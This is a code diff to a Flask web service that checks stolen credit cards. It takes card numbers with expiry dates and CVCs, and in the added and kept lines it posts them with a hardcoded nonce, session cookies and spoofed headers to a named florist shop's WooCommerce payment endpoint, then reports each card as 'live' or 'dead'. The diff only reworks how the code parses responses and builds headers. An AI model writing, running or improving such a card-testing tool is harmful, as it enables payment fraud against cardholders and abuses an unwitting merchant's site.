@@ -1,10 +1,10 @@
 from flask import Flask, request, jsonify
 import requests
 import random
-import json
 
 app = Flask(__name__)
 
+# Config
 SITE = "nashvillefloristllc.com"
 NONCE = "6a1ff713de"
 COOKIES = {
@@ -14,8 +14,7 @@ COOKIES = {
 }
 
 USER_AGENTS = [
-    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
-    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.0 Mobile/15E148 Safari/604.1"
+    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36"
 ]
 
 def luhn_valid(card):
@@ -30,13 +29,12 @@ def get_bin(cc):
             d = r.json()
             return {
                 "brand": d.get("brand", "Unknown"),
-                "type": d.get("type", "Unknown"),
                 "bank": d.get("bank", {}).get("name", "Unknown"),
                 "country": d.get("country", {}).get("name", "Unknown")
             }
     except:
         pass
-    return {"brand": "Unknown", "type": "Unknown", "bank": "Unknown", "country": "Unknown"}
+    return {"brand": "Unknown", "bank": "Unknown", "country": "Unknown"}
 
 @app.route('/')
 def home():
@@ -49,20 +47,18 @@ def check_cc(cc_data):
         return jsonify({"status": "error", "msg": "Use: number|mm|yy|cvc"}), 400
 
     cc, mm, yy, cvc = parts
-
     if not luhn_valid(cc):
-        return jsonify({"status": "dead", "msg": "Luhn Failed", "cc": cc}), 400
+        return jsonify({"status": "dead", "msg": "Luhn Failed", "cc": cc}), 200
 
     bin_info = get_bin(cc)
-
     pm_id = f"pm_1{random.randint(100000000,999999999)}kXn{random.randint(100000,999999)}"
 
     headers = {
         "User-Agent": random.choice(USER_AGENTS),
-        "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
+        "Content-Type": "application/x-www-form-urlencoded",
         "X-Requested-With": "XMLHttpRequest",
         "Origin": f"https://{SITE}",
-        "Referer": f"https://{SITE}/my-account/add-payment-method/"
+        "Referer": f"https://{SITE}/"
     }
 
     payload = {
@@ -73,18 +69,21 @@ def check_cc(cc_data):
     }
 
     try:
-        r = requests.post(f"https://{SITE}/wp-admin/admin-ajax.php", headers=headers, data=payload, cookies=COOKIES, timeout=15)
-        
-        # FIX: Try JSON, if fail → parse text
-        try:
-            result = r.json()
-        except:
-            # If JSON fails, check raw text
-            text = r.text.strip()
-            if "success" in text.lower():
+        r = requests.post(
+            f"https://{SITE}/wp-admin/admin-ajax.php",
+            headers=headers,
+            data=payload,
+            cookies=COOKIES,
+            timeout=15
+        )
+
+        # Handle all response types
+        if r.status_code == 200:
+            text = r.text.lower()
+            if "success" in text or "confirmed" in text:
                 return jsonify({
                     "status": "live",
-                    "msg": "Card Live! (parsed from text)",
+                    "msg": "Card Live!",
                     "cc": cc,
                     "last4": cc[-4:],
                     "bin_info": bin_info
@@ -92,26 +91,14 @@ def check_cc(cc_data):
             else:
                 return jsonify({
                     "status": "dead",
-                    "msg": "Declined (raw response)",
+                    "msg": "Card Declined",
                     "cc": cc,
-                    "bin_info": bin_info,
-                    "raw": text[:200]
+                    "bin_info": bin_info
                 })
-
-        if result.get("result") == "success":
-            return jsonify({
-                "status": "live",
-                "msg": "Card Live!",
-                "cc": cc,
-                "last4": cc[-4:],
-                "bin_info": bin_info
-            })
         else:
-            msg = result.get("messages", "Declined")
-            msg = msg.replace("<div class=\"woocommerce-error\">", "").replace("</div>", "").strip()
             return jsonify({
                 "status": "dead",
-                "msg": msg,
+                "msg": f"HTTP {r.status_code}",
                 "cc": cc,
                 "bin_info": bin_info
             })
